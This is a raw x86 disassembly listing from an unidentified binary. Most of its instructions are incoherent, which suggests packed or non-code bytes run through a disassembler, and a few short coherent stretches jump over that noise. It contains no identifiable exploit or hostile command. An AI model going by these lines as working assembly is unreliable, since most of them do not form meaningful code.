  40b9af:	les    ebp,FWORD PTR [di-0x2326]
  40b9b4:	push   ss
  40b9b5:	sub    eax,0x7dd99ed2
  40b9ba:	aas    
  40b9bb:	shl    DWORD PTR [ebp+ebp*2-0x35],cl
  40b9bf:	xchg   ebx,eax
  40b9c0:	add    DWORD PTR [edi],esp
  40b9c2:	inc    esp
  40b9c3:	ret    0x550f
  40b9c6:	out    0x12,eax
  40b9c8:	add    dh,BYTE PTR [edx+0x38903d7a]
  40b9ce:	arpl   dx,sp
  40b9d0:	fild   QWORD PTR [ebp+0x148a2b73]
  40b9d6:	sub    edi,DWORD PTR [edx-0x19]
  40b9d9:	pusha  
  40b9da:	pop    eax
  40b9db:	sahf   
  40b9dc:	stos   BYTE PTR es:[edi],al
  40b9dd:	mov    edi,0xf2aa8680
  40b9e2:	adc    DWORD PTR ds:0xeef831bf,0xe018c041
  40b9ec:	les    esp,FWORD PTR [edx]
  40b9ee:	bound  ebx,QWORD PTR [eax+0x7d749acc]
  40b9f4:	and    dh,dl
  40b9f6:	sbb    al,0x64
  40b9f8:	fldcw  WORD PTR [ecx]
  40b9fa:	mov    al,dh
  40b9fc:	or     edi,ebx
  40b9fe:	mov    ch,0x80
  40ba00:	inc    esp
  40ba01:	out    dx,eax
  40ba02:	jmp    0x40b98b
  40ba04:	jne    0x40ba7e
  40ba06:	add    ebx,ecx
  40ba08:	mov    dl,0xf8
  40ba0a:	in     al,dx
  40ba0b:	inc    esp
  40ba0c:	leave  
  40ba0d:	sbb    al,0xd4
  40ba0f:	test   eax,0x4dd2f7c5
  40ba14:	inc    edi
  40ba15:	mov    eax,ds:0xeda2e8fc
  40ba1a:	lock pop es
  40ba1c:	dec    edi
  40ba1d:	cmc    
  40ba1e:	pop    ecx
  40ba1f:	aas    
  40ba20:	push   cs
  40ba21:	inc    esp
  40ba22:	iret   
  40ba23:	jmp    0xc443:0xf712bfe9
  40ba2a:	pop    ss
  40ba2b:	xor    esi,eax
  40ba2d:	or     cl,BYTE PTR [ebx+0x49c58403]
  40ba33:	push   0xbf1e01c4
  40ba38:	adc    eax,0xa7242731
  40ba3d:	push   ds
  40ba3e:	daa    
  40ba3f:	jle    0x40ba52
  40ba41:	dec    eax
  40ba42:	int    0xc4
  40ba44:	mov    al,ds:0x1a3a5ae1
  40ba49:	push   edi
  40ba4a:	dec    ecx
  40ba4b:	mul    ch
  40ba4d:	pop    es
  40ba4e:	and    ebp,DWORD PTR [esi]
  40ba50:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  40ba52:	test   al,0x64
  40ba54:	(bad)  
  40ba55:	imul   ebp,DWORD PTR [esi-0x6c],0x47
  40ba59:	out    0x90,al
  40ba5b:	fbstp  TBYTE PTR gs:[edi]
  40ba5e:	jl     0x40ba3e
  40ba60:	push   ebp
  40ba61:	ins    DWORD PTR es:[edi],dx
  40ba62:	in     al,0xc5
  40ba64:	cmp    esi,0x1b
  40ba67:	or     ah,0x20
  40ba6a:	add    al,BYTE PTR ds:0xeb7f4300
  40ba70:	data16 jecxz 0x40ba27
  40ba73:	iret   
  40ba74:	(bad)  
  40ba75:	jns    0x40b9ff
  40ba77:	and    edx,DWORD PTR [edi]
  40ba79:	lea    ecx,ds:0xa5de94f7
  40ba7f:	xor    BYTE PTR ds:0xe3e69031,ch
  40ba85:	out    0x4a,eax
  40ba87:	std    
  40ba88:	cs mov edi,0x548cf37e
  40ba8e:	ret    
  40ba8f:	xchg   edx,eax
  40ba90:	jno    0x40bac2
  40ba92:	stos   BYTE PTR es:[edi],al
  40ba93:	jbe    0x40ba34
  40ba95:	pop    ss
  40ba96:	sbb    ch,BYTE PTR [edx+eiz*2-0x7a]
  40ba9a:	lods   al,BYTE PTR ds:[esi]
  40ba9b:	inc    eax
  40ba9c:	mov    ah,0xe
  40ba9e:	retf   0xf3a4
  40baa1:	inc    esi
  40baa2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40baa3:	inc    ebp
  40baa4:	adc    al,0x1f
  40baa6:	xchg   edi,eax
  40baa7:	clc    
  40baa8:	ins    DWORD PTR es:[edi],dx
  40baa9:	jmp    0x4186e945
  40baae:	inc    ebp
  40baaf:	and    bp,WORD PTR [eax-0x6979a5f5]
  40bab6:	lahf   
  40bab7:	xor    eax,0xe517d2e
  40babc:	lahf   
  40babd:	add    ebx,DWORD PTR [esi]
  40babf:	push   esi
  40bac0:	jbe    0x40bb0e
  40bac2:	scas   al,BYTE PTR es:[edi]
  40bac3:	push   es
  40bac4:	xchg   ebp,eax
  40bac5:	inc    esp
  40bac6:	fs mov dl,0xbc
  40bac9:	sbb    DWORD PTR ds:[edx+0x5e2ff6a4],edx
  40bad0:	push   esp
  40bad1:	dec    ebx
  40bad2:	das    
  40bad3:	adc    ch,bl
  40bad5:	imul   ecx,edi,0xffffffe6
  40bad8:	or     ch,BYTE PTR [edi+ebx*2-0x2d9880fc]
  40badf:	(bad)  
  40bae0:	xchg   edx,eax
  40bae1:	jo     0x40baaa
  40bae3:	push   ebp
  40bae4:	push   edx
  40bae5:	mov    ah,0x91
  40bae7:	ss add eax,0x148094ab
  40baed:	mov    BYTE PTR [ebx+0x5b],cl
  40baf0:	and    al,0xf8
  40baf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40baf3:	int3   
  40baf4:	xor    ecx,DWORD PTR gs:[ecx-0x42]
  40baf8:	adc    al,0x4
  40bafa:	push   0xd8dac724
  40baff:	adc    edi,DWORD PTR [esi-0x404dcebe]
  40bb05:	jmp    0x52390c46
  40bb0a:	(bad)  
  40bb0c:	dec    ecx
  40bb0d:	lods   al,BYTE PTR ds:[esi]
  40bb0e:	mov    dl,0x7f
  40bb10:	adc    eax,0xbb874e0e
  40bb15:	mov    esi,0x7895a57a
  40bb1a:	(bad)  
  40bb1b:	aam    0x9f
  40bb1d:	dec    ebp
  40bb1e:	mov    DWORD PTR [edx],ebp
  40bb20:	jp     0x40bb36
  40bb22:	retf   0xf752
  40bb25:	mov    ds:0x51ef9e91,eax
  40bb2a:	sbb    dl,BYTE PTR [edi+0x77]
  40bb2d:	jle    0x40bb51
  40bb2f:	out    0xcb,eax
  40bb31:	adc    BYTE PTR [esi+eiz*8],0x26
  40bb35:	imul   ebp,DWORD PTR [edx+0x7a],0x28
  40bb39:	pop    ss
  40bb3a:	frstor [edx-0x3a]
  40bb3d:	test   DWORD PTR [edi+0x10],edx
  40bb40:	cmp    al,0x32
  40bb42:	jl     0x40bbb9
  40bb44:	push   0x3
  40bb46:	stos   BYTE PTR es:[edi],al
  40bb47:	sub    BYTE PTR [edx],ch
  40bb49:	add    DWORD PTR [ebp-0x60aa37c2],ebx
  40bb4f:	mov    al,ds:0xf9e00b96
  40bb54:	sbb    eax,0xbe1d5188
  40bb59:	or     esp,DWORD PTR [ecx+0x6b7a4abb]
  40bb5f:	inc    ebx
  40bb60:	dec    edi
  40bb61:	call   0x74e6:0x26105b4a
  40bb68:	rol    BYTE PTR [ebp+eiz*8+0x53354d32],cl
  40bb6f:	xor    edx,ebp
  40bb71:	outs   dx,BYTE PTR ds:[esi]
  40bb72:	jbe    0x40bba0
  40bb74:	cmp    bl,BYTE PTR [edi-0x80]
  40bb77:	fidiv  WORD PTR [edx]
  40bb79:	shr    BYTE PTR [edx+0x6],cl
  40bb7c:	xchg   ebp,eax
  40bb7d:	pusha  
  40bb7e:	pop    es
  40bb7f:	push   eax
  40bb80:	arpl   WORD PTR [ebx-0x53cc653c],bx
  40bb86:	jmp    0x4af1:0x9b4b4f68
  40bb8d:	cmp    al,0x64
  40bb8f:	sbb    DWORD PTR [eax+0x56900c87],eax
  40bb95:	add    al,0x54
  40bb97:	fwait
  40bb98:	enter  0x13a1,0xab
  40bb9c:	jecxz  0x40bc1a
  40bb9e:	mov    eax,0xc67f138d
  40bba3:	aad    0xa6
  40bba5:	jbe    0x40bbd0
  40bba7:	aad    0x7f
  40bba9:	sbb    al,0xf3
  40bbab:	jns    0x40bb78
  40bbad:	mov    eax,0x83f51d27
  40bbb2:	push   esi
  40bbb3:	rcl    DWORD PTR [edi-0x4190b0db],cl
  40bbb9:	into   
  40bbba:	imul   esi,ebp,0xb40e61a8
  40bbc0:	inc    ecx
  40bbc1:	or     ebp,DWORD PTR [edi+0x37663aab]
  40bbc7:	ret    0x8fe4
  40bbca:	mov    edi,DWORD PTR [ecx]
  40bbcc:	add    dl,BYTE PTR [ebp-0x30f9eff7]
  40bbd2:	imul   ecx,DWORD PTR [edx-0x9c0935d],0xb644dade
  40bbdc:	xchg   edx,eax
  40bbdd:	pop    eax
  40bbde:	jne    0x40bb7b
  40bbe0:	push   es
  40bbe1:	cmp    eax,0xb091808f
  40bbe6:	ss test al,0xe2
  40bbe9:	ins    BYTE PTR es:[edi],dx
  40bbea:	scas   eax,DWORD PTR es:[edi]
  40bbeb:	iret   
  40bbec:	retf   0x4fd2
  40bbef:	push   edx
  40bbf0:	xor    DWORD PTR [esi+0x1e],ebx
  40bbf3:	xor    BYTE PTR [esp+eax*8+0x36],bh
  40bbf7:	ret    
  40bbf8:	xor    BYTE PTR [eax+0x19],ch
  40bbfb:	cmp    ebx,ebx
  40bbfd:	test   BYTE PTR [ebx-0x3b],bh
  40bc00:	(bad)  
  40bc01:	fmul   QWORD PTR [edi-0x7d6d3300]
  40bc07:	xlat   BYTE PTR ds:[ebx]
  40bc08:	pop    edi
  40bc09:	mov    bl,0xea
  40bc0b:	xor    DWORD PTR [ebp+0x6a],esi
  40bc0e:	pop    esp
  40bc0f:	xchg   DWORD PTR [ecx],esi
  40bc11:	mov    eax,ds:0x16c3037e
  40bc16:	imul   edx,DWORD PTR [esi+0x1e],0x5d
  40bc1a:	xchg   ebx,eax
  40bc1b:	inc    ebx
  40bc1c:	mov    al,0x7b
  40bc1e:	loop   0x40bbab
  40bc20:	mov    eax,ds:0x33a1b107
  40bc25:	push   eax
  40bc26:	mov    ecx,0x2c223ce6
  40bc2b:	or     DWORD PTR [ebp-0x608bf62],0x9c3c540d
  40bc35:	push   ds
  40bc36:	xlat   BYTE PTR ds:[ebx]
  40bc37:	or     ch,BYTE PTR [ecx+0x164521dd]
  40bc3d:	pop    edx
  40bc3e:	inc    ebp
  40bc3f:	cmp    al,0x1e
  40bc41:	add    eax,0xfc99b0d5
  40bc46:	or     bl,BYTE PTR [ecx-0x7825adcd]
  40bc4c:	(bad)  
  40bc4d:	fld    DWORD PTR [edi+ebx*1]
  40bc50:	adc    edi,edi
  40bc52:	sbb    bl,BYTE PTR [ebx+0x0]
  40bc55:	and    BYTE PTR fs:[ebp+0xad79197],bh
  40bc5c:	outs   dx,BYTE PTR ds:[esi]
  40bc5d:	cwde   
  40bc5e:	dec    ebx
  40bc5f:	mov    ecx,0x4cac7f0b
  40bc64:	ja     0x40bbff
  40bc66:	jnp    0x40bca7
  40bc68:	das    
  40bc69:	mov    esp,0x1f965188
  40bc6e:	in     al,dx
  40bc6f:	cld    
  40bc70:	inc    ebp
  40bc71:	mov    ecx,0xb2ec5d7f
  40bc76:	cmc    
  40bc77:	inc    edi
  40bc78:	fidiv  WORD PTR [edi-0x77]
  40bc7b:	adc    eax,0x8b56e26b
  40bc80:	or     eax,0xce0c24cc
  40bc85:	popf   
  40bc86:	test   al,cl
  40bc88:	mov    esp,0xa580e6be
  40bc8d:	stos   BYTE PTR es:[edi],al
  40bc8e:	adc    bh,BYTE PTR [eax]
  40bc90:	test   al,0xe8
  40bc92:	das    
  40bc93:	mov    edx,0xf001bca
  40bc98:	sub    al,al
  40bc9a:	cmp    bl,al
  40bc9c:	cmp    al,0xee
  40bc9e:	push   ds
  40bc9f:	out    0x97,eax
  40bca1:	stos   BYTE PTR es:[edi],al
  40bca2:	call   0x4349:0xc33efd54
  40bca9:	mov    ah,BYTE PTR [ebp+0x55a7a1e3]
  40bcaf:	sub    al,0xb3
  40bcb1:	mov    al,0x78
  40bcb3:	stc    
  40bcb4:	(bad)  
  40bcb5:	and    DWORD PTR [edx-0x22],ebx
  40bcb8:	out    0xce,eax
  40bcba:	xor    eax,0xe30d350
  40bcbf:	iret   
  40bcc0:	shr    DWORD PTR [ebx],cl
  40bcc2:	push   cs
  40bcc3:	pop    esp
  40bcc4:	add    al,0x30
  40bcc6:	sbb    esi,DWORD PTR [eax+0x2863ca37]
  40bccc:	sub    eax,DWORD PTR [edi+0x15c493f4]
  40bcd2:	mov    ebx,DWORD PTR [ebx-0x26a48a3c]
  40bcd8:	inc    esp
  40bcd9:	mov    ch,cl
  40bcdb:	add    esi,DWORD PTR [edi-0x2d]
  40bcde:	push   ds
  40bcdf:	iret   
  40bce0:	in     eax,0xae
  40bce2:	and    esp,ebx
  40bce4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bce5:	xchg   esp,eax
  40bce6:	mov    edx,0xb446255f
  40bceb:	rol    DWORD PTR [ebx+0x75],cl
  40bcee:	jecxz  0x40bc83
  40bcf0:	ret    0x94f9
  40bcf3:	test   BYTE PTR [ebx-0x20d40fa3],cl
  40bcf9:	cmp    ebx,edx
  40bcfb:	ja     0x40bd09
  40bd01:	mov    edx,DWORD PTR [ebp-0x34]
  40bd04:	jmp    0x40c0ee
  40bd09:	mov    edx,DWORD PTR [ebp-0x3c]
  40bd0c:	mov    edi,DWORD PTR [ebp-0x4]
  40bd0f:	xor    edx,eax
  40bd11:	xor    edi,eax
  40bd13:	add    edx,ecx
  40bd15:	add    edi,ecx
  40bd17:	imul   edx,edi
  40bd1a:	mov    edi,DWORD PTR [ebp-0x8]
  40bd1d:	mov    ebx,DWORD PTR [ebp-0x10]
  40bd20:	sub    ebx,edi
  40bd22:	cmp    ebx,edx
  40bd24:	mov    edx,DWORD PTR [ebp-0x38]
  40bd27:	jbe    0x40c0ee
  40bd2d:	jmp    0x40c0eb
  40bd32:	xchg   edx,eax
  40bd33:	dec    edx
  40bd34:	inc    edx
  40bd35:	inc    esp
  40bd36:	inc    edx
  40bd37:	push   esp
  40bd38:	xchg   edx,eax
  40bd39:	dec    edx
  40bd3a:	fdiv   DWORD PTR [edx+edi*8]
  40bd3d:	adc    ah,BYTE PTR [esi-0x7f]
  40bd40:	and    ch,al
  40bd42:	(bad)  
  40bd43:	(bad)  
  40bd44:	jo     0x40bdb6
  40bd46:	lahf   
  40bd47:	jge    0x40bdb9
  40bd49:	jo     0x40bd07
  40bd4b:	mov    ebx,DWORD PTR [ebp-0x11e34c11]
  40bd51:	fild   QWORD PTR [edx+0x74]
  40bd54:	iret   
  40bd55:	add    DWORD PTR [ebp+0x78],esi
  40bd58:	adc    ebp,DWORD PTR [ebx]
  40bd5a:	inc    ebx
  40bd5b:	push   cx
  40bd5d:	mov    eax,0x81b53db3
  40bd62:	int    0xcc
  40bd64:	jb     0x40bd27
  40bd66:	sar    BYTE PTR [esi-0x2ac71044],0xa3
  40bd6d:	into   
  40bd6e:	sub    BYTE PTR [ebp-0x4],al
  40bd71:	sbb    al,0x94
  40bd73:	push   edi
  40bd74:	aad    0xb5
  40bd76:	or     al,0x9d
  40bd78:	ss cmc 
  40bd7a:	aam    0x8
  40bd7c:	(bad)  
  40bd7d:	sub    al,0xeb
  40bd7f:	out    dx,eax
  40bd80:	sub    DWORD PTR [edi-0x1c288281],esp
  40bd86:	out    0xa4,eax
  40bd88:	pusha  
  40bd89:	push   esp
  40bd8a:	pop    DWORD PTR [ecx+0x3a]
  40bd8d:	and    al,BYTE PTR ds:0x76adb7
  40bd93:	dec    ecx
  40bd94:	scas   eax,DWORD PTR es:[edi]
  40bd95:	xchg   esp,eax
  40bd96:	jne    0x40bdf4
  40bd98:	popf   
  40bd99:	add    bl,cl
  40bd9b:	fs add eax,0x8321f4a1
  40bda1:	mov    edi,0x7c698a82
  40bda6:	fbld   TBYTE PTR [esi]
  40bda8:	mov    ah,0x4c
  40bdaa:	adc    DWORD PTR [ebx-0x29650e9d],ecx
  40bdb0:	popa   
  40bdb1:	push   esp
  40bdb2:	or     cl,BYTE PTR [eax-0x1454472]
  40bdb8:	loop   0x40bde4
  40bdba:	inc    esp
  40bdbb:	sbb    DWORD PTR [ebx+0x36],edi
  40bdbe:	or     eax,0x2a8a8521
  40bdc3:	jns    0x40bd72
  40bdc5:	xchg   ebp,eax
  40bdc6:	scas   al,BYTE PTR es:[edi]
  40bdc7:	in     eax,dx
  40bdc8:	jmp    0x40bda1
  40bdca:	call   DWORD PTR [eax+0x43bbabc0]
  40bdd0:	jp     0x40bdaa
  40bdd2:	sub    dl,bh
  40bdd4:	dec    ecx
  40bdd5:	(bad)  
  40bdd6:	xchg   ebx,eax
  40bdd7:	js     0x40be4a
  40bdd9:	shr    BYTE PTR [esp+edx*1-0x40],cl
  40bddd:	std    
  40bdde:	jp     0x40be0e
  40bde0:	sbb    eax,0x7890a05c
  40bde5:	sar    edx,cl
  40bde7:	sub    DWORD PTR [edi-0x50a48c92],0x83cc5fd2
  40bdf1:	repz imul ecx,DWORD PTR [edx-0x3c60cda1],0x5f
  40bdf9:	mov    WORD PTR [eax],es
  40bdfb:	sbb    esp,DWORD PTR [ecx]
  40bdfd:	sbb    DWORD PTR [eax+0x78],edx
  40be00:	loopne 0x40be35
  40be02:	and    al,0xb3
  40be04:	inc    esp
  40be05:	mov    al,ds:0x687c2e99
  40be0a:	fisubr WORD PTR [di]
  40be0d:	xchg   esp,eax
  40be0e:	(bad)
  40be12:	xor    cl,BYTE PTR [esi-0x39]
  40be15:	cmp    esi,ebp
  40be17:	mov    ah,0xfa
  40be19:	popf   
  40be1a:	lods   eax,DWORD PTR ds:[esi]
  40be1b:	into   
  40be1c:	adc    bl,BYTE PTR [ebx]
  40be1e:	out    0x4c,al
  40be20:	push   ds
  40be21:	in     eax,0x6e
  40be23:	shr    BYTE PTR [edx+0x79],1
  40be26:	or     eax,0x2f6a273
  40be2b:	mov    ds:0x9083d571,al
  40be30:	inc    ebp
  40be31:	aam    0x6d
  40be33:	js     0x40be50
  40be35:	(bad)  
  40be36:	outs   dx,BYTE PTR ds:[esi]
  40be37:	xor    eax,0x16303c43
  40be3c:	mov    ds,WORD PTR [edx]
  40be3e:	cmp    eax,0x4317531e
  40be43:	fcom   DWORD PTR [edx+0x1c9cf010]
  40be49:	lahf   
  40be4a:	test   ebx,0xf25ef289
  40be50:	mov    al,0x13
  40be52:	sub    edx,edx
  40be54:	and    al,0x13
  40be56:	fadd   DWORD PTR [eax-0x36ea7e6c]
  40be5c:	adc    BYTE PTR [edi-0xf],bl
  40be5f:	lock mov eax,0x7d52d970
  40be65:	cld    
  40be66:	cmp    eax,0xf412df2e
  40be6b:	cs leave 
  40be6d:	push   esp
  40be6e:	dec    edi
  40be6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be71:	adc    al,0x12
  40be73:	sbb    DWORD PTR [esi+ebx*8],esp
  40be76:	adc    ebx,ebx
  40be78:	push   0xd95c949b
  40be7d:	cmp    ebx,DWORD PTR [eax+esi*2+0x6b]
  40be81:	ins    BYTE PTR es:[edi],dx
  40be82:	xchg   edi,eax
  40be83:	in     al,dx
  40be84:	or     BYTE PTR [ebx+ebp*4],cl
  40be87:	aas    
  40be88:	pop    esp
  40be89:	or     DWORD PTR [ecx+0x47165040],ecx
  40be8f:	cmp    esp,ebp
  40be91:	sbb    eax,0xe33f8421
  40be96:	jae    0x40be93
  40be98:	fwait
  40be99:	std    
  40be9a:	dec    esp
  40be9b:	arpl   WORD PTR [esi+ebp*4-0x79],sp
  40be9f:	frstor [ecx-0x770ae799]
  40bea5:	pop    edx
  40bea6:	push   es
  40bea7:	in     al,dx
  40bea8:	lods   al,BYTE PTR ds:[esi]
  40bea9:	sub    BYTE PTR [ecx],cl
  40beab:	xchg   DWORD PTR [ecx-0x53],eax
  40beae:	xor    BYTE PTR [ebx],bh
  40beb0:	leave  
  40beb1:	add    eax,edx
  40beb3:	mov    edi,0x782e5cd1
  40beb8:	out    dx,al
  40beb9:	jmp    0x40be5d
  40bebb:	pop    ds
  40bebc:	js     0x40be89
  40bebe:	mov    cl,0xd2
  40bec0:	inc    ebp
  40bec1:	cmp    ch,bh
  40bec3:	dec    esp
  40bec4:	and    ebx,DWORD PTR [edx]
  40bec6:	and    DWORD PTR [esi+0x6a8d6590],esp
  40becc:	fstp   TBYTE PTR [edx-0x48202e77]
  40bed2:	jg     0x40bf13
  40bed4:	jo     0x40bed7
  40bed6:	and    BYTE PTR [esi],0xfe
  40bed9:	pusha  
  40beda:	popa   
  40bedb:	pushf  
  40bedc:	pop    esi
  40bedd:	mov    ?,WORD PTR [eax+0x36]
  40bee0:	or     ch,BYTE PTR [eax+ecx*1]
  40bee3:	cmp    dl,ah
  40bee5:	ins    DWORD PTR es:[edi],dx
  40bee6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bee7:	das    
  40bee8:	pushf  
  40bee9:	xchg   edi,eax
  40beea:	cmp    al,0xa0
  40beec:	mov    esp,0xca3b34a4
  40bef1:	cli    
  40bef2:	adc    al,bh
  40bef4:	mov    eax,ds:0xaadb0e0
  40bef9:	xor    bh,BYTE PTR [ebp-0x7c]
  40befc:	jbe    0x40bf1f
  40befe:	pushf  
  40beff:	xor    DWORD PTR [ebp-0x400fd46b],esi
  40bf05:	bound  edi,QWORD PTR [eax]
  40bf07:	int3   
  40bf08:	les    esi,FWORD PTR [bp+si+0x6a]
  40bf0c:	fisttp QWORD PTR ds:0xf6a909a3
  40bf12:	push   edx
  40bf13:	cmp    BYTE PTR [edi+eiz*8-0x190f4b17],0xd8
  40bf1b:	pop    esp
  40bf1c:	push   0x72
  40bf1e:	ret    
  40bf1f:	(bad)  
  40bf20:	cmc    
  40bf21:	and    dh,BYTE PTR [edi]
  40bf23:	ret    
  40bf24:	push   ds
  40bf25:	inc    esi
  40bf26:	and    eax,0xc05044ef
  40bf2b:	mov    ebp,0x14e05e
  40bf30:	mov    dh,0x4c
  40bf32:	out    0xd6,al
  40bf34:	out    dx,eax
  40bf35:	cwde   
  40bf36:	clc    
  40bf37:	out    dx,eax
  40bf38:	and    al,0x6c
  40bf3a:	je     0x40bf3e
  40bf3c:	int3   
  40bf3d:	mov    ebx,0x35546cfe
  40bf42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf43:	push   ebx
  40bf44:	inc    esp
  40bf45:	ja     0x40bfa7
  40bf47:	adc    DWORD PTR [ecx-0x1b],ebx
  40bf4a:	std    
  40bf4b:	xchg   ebp,eax
  40bf4c:	jns    0x40bedb
  40bf4e:	stc    
  40bf4f:	test   eax,0x54ee05d1
  40bf54:	sub    eax,0x2aec3ed4
  40bf59:	or     ecx,DWORD PTR ds:0x4a9f3588
  40bf5f:	pop    ecx
  40bf60:	sti    
  40bf61:	xor    ebp,DWORD PTR ds:0x5ede65ee
  40bf67:	fiadd  DWORD PTR [esi]
  40bf69:	push   0x3e30862c
  40bf6e:	fnstsw WORD PTR [eax+esi*4]
  40bf71:	xlat   BYTE PTR ds:[ebx]
  40bf72:	mov    bl,0x1d
  40bf74:	ret    
  40bf75:	xchg   ecx,eax
  40bf76:	cmp    dh,BYTE PTR [ebx]
  40bf78:	(bad)
  40bf7c:	xor    BYTE PTR ds:0x8491e427,bh
  40bf82:	pop    ebp
  40bf83:	sahf   
  40bf84:	sbb    DWORD PTR [ecx-0x52286d9b],eax
  40bf8a:	ja     0x40bf12
  40bf8c:	adc    BYTE PTR [edx-0x54],ah
  40bf8f:	shl    BYTE PTR [ecx+0x2afd3bc5],1
  40bf95:	dec    ecx
  40bf96:	rcl    DWORD PTR [edx],cl
  40bf98:	xor    DWORD PTR [ebx],edx
  40bf9a:	lods   eax,DWORD PTR ds:[esi]
  40bf9b:	jl     0x40bf6e
  40bf9d:	push   ebx
  40bf9e:	pop    eax
  40bf9f:	fmul   st(3),st
  40bfa1:	push   esi
  40bfa2:	cli    
  40bfa3:	in     al,0xb8
  40bfa5:	xor    BYTE PTR [ebp-0x52af416d],ah
  40bfab:	inc    ebx
  40bfac:	mov    ebp,es
  40bfae:	and    edi,ebx
  40bfb0:	push   ss
  40bfb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfb2:	or     al,0x6f
  40bfb4:	ror    DWORD PTR [eax],1
  40bfb6:	xor    bl,al
  40bfb8:	or     eax,0xc92aad28
  40bfbd:	into   
  40bfbe:	jmp    0xc6bcd652
  40bfc3:	loope  0x40bfec
  40bfc5:	mov    dl,0x69
  40bfc7:	xor    ecx,edi
  40bfc9:	out    0xb,al
  40bfcb:	cmp    al,0xad
  40bfcd:	push   edx
  40bfce:	scas   eax,DWORD PTR es:[edi]
  40bfcf:	jns    0x40bf66
  40bfd1:	add    dl,ah
  40bfd3:	rol    ah,cl
  40bfd5:	sahf   
  40bfd6:	aaa    
  40bfd7:	sbb    al,0xc7
  40bfd9:	fwait
  40bfda:	clc    
  40bfdb:	jmp    0x9fb2:0xfa960db3
  40bfe2:	js     0x40bffd
  40bfe4:	in     al,0xe5
  40bfe6:	push   ecx
  40bfe7:	mov    dl,0x63
  40bfe9:	outs   dx,BYTE PTR ds:[esi]
  40bfea:	inc    eax
  40bfeb:	inc    eax
  40bfec:	adc    eax,0xa93c9538
  40bff1:	leave  
  40bff2:	sbb    al,0x1c
  40bff4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bff5:	(bad)  
  40bff6:	mov    eax,0x5b06b6d
  40bffb:	ins    BYTE PTR es:[edi],dx
  40bffc:	int3   
  40bffd:	xor    BYTE PTR [edi+0x5a579455],ch
  40c003:	push   0xffffff89
  40c005:	mov    cl,0x13
  40c007:	je     0x40bfb1
  40c009:	loop   0x40c03f
  40c00b:	and    cl,dh
  40c00d:	cld    
  40c00e:	cs mov ah,0x45
  40c011:	and    al,0xfc
  40c013:	sbb    eax,0x3435e999
  40c018:	in     eax,dx
  40c019:	or     eax,0x48ddf6d6
  40c01e:	push   eax
  40c01f:	jg     0x40bfbe
  40c021:	mov    ch,BYTE PTR [esi+0x28]
  40c024:	jbe    0x40c0a4
  40c026:	xchg   edi,eax
  40c027:	test   DWORD PTR [edx-0x1fec2f44],esi
  40c02d:	stos   BYTE PTR es:[edi],al
  40c02e:	cmp    esp,DWORD PTR [ecx+0x600b2dee]
  40c034:	mov    edi,DWORD PTR [ecx+edx*1-0x59]
  40c038:	and    DWORD PTR [ecx-0x6dbe298c],edx
  40c03e:	and    eax,0xe9f0a700
  40c043:	repz scas eax,DWORD PTR es:[edi]
  40c045:	inc    ebx
  40c046:	mov    ds:0xb86e9278,al
  40c04b:	xor    al,0x6
  40c04d:	xchg   esi,eax
  40c04e:	dec    edx
  40c04f:	mov    al,ds:0xbcffec15
  40c054:	leave  
  40c055:	outs   dx,DWORD PTR gs:[esi]
  40c057:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c058:	loop   0x40c068
  40c05a:	jae    0x40c022
  40c05c:	dec    ecx
  40c05d:	add    al,0x6f
  40c05f:	sbb    al,0x59
  40c061:	dec    esi
  40c063:	sub    edx,DWORD PTR [eax+0x7d]
  40c066:	cmp    eax,0x9b270691
  40c06b:	add    eax,edi
  40c06d:	imul   BYTE PTR [ecx-0x71]
  40c070:	ss jecxz 0x40c096
  40c073:	stos   DWORD PTR es:[edi],eax
  40c074:	pop    es
  40c075:	mov    al,ds:0x18c24a9
  40c07a:	pop    edx
  40c07b:	out    dx,eax
  40c07c:	test   eax,0xb89460c0
  40c081:	mov    esp,0x266399da
  40c086:	inc    edi
  40c087:	inc    edi
  40c088:	test   BYTE PTR [ecx+0x47],dl
  40c08b:	test   eax,0xe18faade
  40c090:	adc    BYTE PTR [ecx-0x31e0a797],dh
  40c096:	out    dx,eax
  40c097:	bound  edi,QWORD PTR [ebp-0x34]
  40c09a:	fidiv  DWORD PTR [eax-0x22]
  40c09d:	jle    0x40c074
  40c09f:	xor    al,0x77
  40c0a1:	push   esi
  40c0a2:	sahf   
  40c0a3:	shl    bh,1
  40c0a5:	push   ecx
  40c0a6:	sub    al,0x80
  40c0a8:	mov    ah,0x2a
  40c0aa:	and    eax,0x93a25a47
  40c0af:	xchg   ebx,eax
  40c0b0:	jle    0x40c092
  40c0b2:	out    dx,al
  40c0b3:	cmp    ebp,DWORD PTR [eax+0x7057a182]
  40c0b9:	ins    BYTE PTR es:[edi],dx
  40c0ba:	sub    bl,BYTE PTR [ebx+0x290d92b4]
  40c0c0:	cmp    dh,0xa8
  40c0c3:	fiadd  WORD PTR [esi]
  40c0c5:	aaa    
  40c0c6:	cld    
  40c0c7:	lods   al,BYTE PTR ds:[esi]
  40c0c8:	xchg   esp,eax
  40c0c9:	lods   al,BYTE PTR ds:[esi]
  40c0ca:	lahf   
  40c0cb:	cmc    
  40c0cc:	sub    BYTE PTR fs:[edi+0x122b366],dh
  40c0d3:	xor    DWORD PTR cs:[ebp+0x5c1035a4],edi
  40c0da:	add    BYTE PTR [edx+0x64b711dc],0xeb
  40c0e1:	cmp    ebp,edi
  40c0e3:	sar    DWORD PTR [edx-0x71],cl
  40c0e6:	sbb    eax,0x9c19085b
  40c0eb:	mov    edx,DWORD PTR [ebp-0x3c]
  40c0ee:	mov    edi,DWORD PTR [ebp-0x4]
  40c0f1:	xor    edi,eax
  40c0f3:	xor    edx,eax
  40c0f5:	add    edi,ecx
  40c0f7:	add    edx,ecx
  40c0f9:	imul   edx,edi
  40c0fc:	mov    DWORD PTR [ebp+0xc],edx
  40c0ff:	mov    edx,DWORD PTR [ebp+0xc]
  40c102:	mov    DWORD PTR [ebp-0x24],edx
  40c105:	mov    edx,DWORD PTR [ebp-0x8]
  40c108:	add    edx,DWORD PTR [ebp-0x40]
